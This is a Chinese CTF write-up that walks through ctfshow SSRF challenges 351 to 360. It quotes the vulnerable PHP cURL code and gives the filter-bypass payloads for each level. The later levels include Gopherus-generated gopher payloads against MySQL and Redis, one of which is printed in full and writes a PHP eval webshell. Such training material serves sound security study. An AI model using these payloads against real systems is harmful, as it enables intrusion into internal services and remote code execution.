---
title: ctfshow-ssrf
id: ctfshow-ssrf
date: 2021-09-3 15:53:33
sidebar_position: 11
---

<!-- more -->

ssrf开始啦

[SSRF漏洞的利用与攻击内网应用实战 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7405)


## 351

> ```php
> <?php
> error_reporting(0);
> highlight_file(__FILE__);
> $url=$_POST['url'];
> $ch=curl_init($url);	# 初始化 cURL 会话
> # curl_setopt — 设置 cURL 传输选项
> curl_setopt($ch, CURLOPT_HEADER, 0);
> # 启用时会将头文件的信息作为数据流输出。	
> curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
> # 启用时将curl_exec()获取的信息以字符串返回，而不是直接输出。
> $result=curl_exec($ch);	# 执行 cURL 会话
> curl_close($ch);	# 关闭 cURL 会话
> echo ($result);
> ?>
> ```
>
> [PHP: cURL 函数 - Manual](https://www.php.net/manual/zh/ref.curl.php)

存在flag.php,访问显示：非本地用户禁止访问
post传值即可：

```
url=127.0.0.1/flag.php
```

后来看和其他师傅交流发现还有一种解法，利用file伪协议读取本地文件：

```
url=file:///var/www/html/flag.php
```

## 352

> ```php
> <?php
> error_reporting(0);
> highlight_file(__FILE__);
> $url=$_POST['url'];
> $x=parse_url($url);	#parse_url — 解析 URL，返回其组成部分
> if($x['scheme']==='http'||$x['scheme']==='https'){
> if(!preg_match('/localhost|127.0.0/')){
> $ch=curl_init($url);
> curl_setopt($ch, CURLOPT_HEADER, 0);
> curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
> $result=curl_exec($ch);
> curl_close($ch);
> echo ($result);
> }
> else{
>     die('hacker');
> }
> }
> else{
>     die('hacker');
> }
> ?>
> ```
>
> [PHP: parse_url - Manual](https://www.php.net/manual/zh/function.parse-url)

要求使用http和https协议，同时过滤了localhost和127.0.0
那么351的方法都不能用了，绕过方法也很多：

`127.0.1`、`127.1`、`127。0.0.1`、或者`转进制:`[IP地址进制转换 (520101.com)](https://tool.520101.com/wangluo/jinzhizhuanhuan/)

这里用：

```
url=http://127.1/flag.php
```

## 353

> ```php
> <?php
> error_reporting(0);
> highlight_file(__FILE__);
> $url=$_POST['url'];
> $x=parse_url($url);
> if($x['scheme']==='http'||$x['scheme']==='https'){
> if(!preg_match('/localhost|127\.0\.|\。/i', $url)){
> $ch=curl_init($url);
> curl_setopt($ch, CURLOPT_HEADER, 0);
> curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
> $result=curl_exec($ch);
> curl_close($ch);
> echo ($result);
> }
> else{
>     die('hacker');
> }
> }
> else{
>     die('hacker');
> }
> ?> hacker
> ```
>
> 

把127、.0、.、。过滤了
转进制[IP地址进制转换 (520101.com)](https://tool.520101.com/wangluo/jinzhizhuanhuan/)或者127.1都可

```
url=http://127.1/flag.php
```

## 354

> ```php
> <?php
> error_reporting(0);
> highlight_file(__FILE__);
> $url=$_POST['url'];
> $x=parse_url($url);
> if($x['scheme']==='http'||$x['scheme']==='https'){
> if(!preg_match('/localhost|1|0|。/i', $url)){
> $ch=curl_init($url);
> curl_setopt($ch, CURLOPT_HEADER, 0);
> curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
> $result=curl_exec($ch);
> curl_close($ch);
> echo ($result);
> }
> else{
>     die('hacker');
> }
> }
> else{
>     die('hacker');
> }
> ?>
> ```
>
> 

羽师傅说预期解是用脚本替换localhost的字符，但是服务器不支持

```python
for i in range(128,65537):    
    tmp=chr(i)    
    try:        
        res = tmp.encode('idna').decode('utf-8')        
        if("-") in res:            
            continue        
        print("U:{}    A:{}      ascii:{} ".format(tmp, res, i))    
    except:        
        pass

```

这里可以修改自己域名的a记录为127.0.0.1，然后访问http://域名/flag.php
这里贴一下一位师傅修改过的域名：http://sudo.cc

## 355

> ```php
> <?php
> error_reporting(0);
> highlight_file(__FILE__);
> $url=$_POST['url'];
> $x=parse_url($url);
> if($x['scheme']==='http'||$x['scheme']==='https'){
> $host=$x['host'];
> if((strlen($host)<=5)){
> $ch=curl_init($url);
> curl_setopt($ch, CURLOPT_HEADER, 0);
> curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
> $result=curl_exec($ch);
> curl_close($ch);
> echo ($result);
> }
> else{
>     die('hacker');
> }
> }
> else{
>     die('hacker');
> }
> ?>
> ```
>
> 

要求host长度<=5
那么

```
http://127.1/flag.php
```

## 356

```php
if((strlen($host)<=3))
```

要求host长度<=3
可以用0：在linux中解析为127.0.0.1；windows中解析为0.0.0.0

```
http://0/flag.php
```

## 357

> ```php
> <?php
> error_reporting(0);
> highlight_file(__FILE__);
> $url=$_POST['url'];
> $x=parse_url($url);
> if($x['scheme']==='http'||$x['scheme']==='https'){
> $ip = gethostbyname($x['host']);
> echo '</br>'.$ip.'</br>';
> if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
>     die('ip!');
> }
> 
> 
> echo file_get_contents($_POST['url']);
> }
> else{
>     die('scheme');
> }
> ?>
> ```
>
> - FILTER_FLAG_IPV4 – 要求值是合法的 IPv4 IP（比如 255.255.255.255）
> - FILTER_FLAG_IPV6 – 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）
> - FILTER_FLAG_NO_PRIV_RANGE – 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）
> - FILTER_FLAG_NO_RES_RANGE – 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。

302跳转(其实354也可以用这个方法)

在自己服务器写个php文件，然后访问：http://xxx/xxx.php

```php
<?php
header("Location:http://127.0.0.1/flag.php"); 
```

或者是dns重绑定
原理：[浅谈DNS重绑定漏洞 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/89426041)

可以在[CEYE - Monitor service for security testing](http://ceye.io/)注册一个帐号
修改dns rebinding：加一个127.0.0.1
然后用给的域名就行：http://r.xxx/flag.php



## 358

> ```php
> <?php
> error_reporting(0);
> highlight_file(__FILE__);
> $url=$_POST['url'];
> $x=parse_url($url);
> if(preg_match('/^http:\/\/ctf\..*show$/i',$url)){
>     echo file_get_contents($url);
> }
> ```
>
> 

正则表达式要匹配`http://ctf.`开头，`show`结尾的url：
按url格式构造一下：

```
http://ctf.@127.0.0.1/flag.php?show
```

- php的curl默认读取@后面的部分

  ```
  http://abc@127.0.0.1
  实际上是以用户名abc连接到站点127.0.0.
  ```

- ?后默认为get参数

## 359

> hint：打无密码的mysql
>
> 一个登录框login后跳转到check.php
> ![](https://i.loli.net/2021/09/03/5KC9dOz2mUcF1qa.png)
>
> 工具：[tarunkant/Gopherus: This tool generates gopher link for exploiting SSRF and gaining RCE in various servers (github.com)](https://github.com/tarunkant/Gopherus)

```
python2 gopherus.py --exploit mysql
```

```
用户名：root
查询语句写马：select '<?php eval($_POST[a]); ?>' INTO OUTFILE '/var/www/html/a.php';
```

![](https://i.loli.net/2021/09/03/g2cKnNP9ShJMOro.png)

得到：

```
gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%47%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%61%5d%29%3b%20%3f%3e%27%20%49%4e%54%4f%20%4f%55%54%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%61%2e%70%68%70%27%3b%01%00%00%00%01
```

因为浏览器本身会对url进行一次解码，解码后的url可能含特殊字符，所以对下划线_后的部分再编码一次，然后再到check.php用returl=xxx传入即可getshell

![](https://i.loli.net/2021/09/03/oHzVgRShUwYQqLj.png)

## 360

> 打redis
>
> ```php
> <?php
> error_reporting(0);
> highlight_file(__FILE__);
> $url=$_POST['url'];
> $ch=curl_init($url);
> curl_setopt($ch, CURLOPT_HEADER, 0);
> curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
> $result=curl_exec($ch);
> curl_close($ch);
> echo ($result);
> ?>
> ```
>
> 

```
python gopherus.py --exploit redis
```

![](https://i.loli.net/2021/09/03/fcEwUpJuiO24IoT.png)

操作同上，同样要记得二次编码

![](https://i.loli.net/2021/09/03/E4aHYCi9Oymh3wV.png)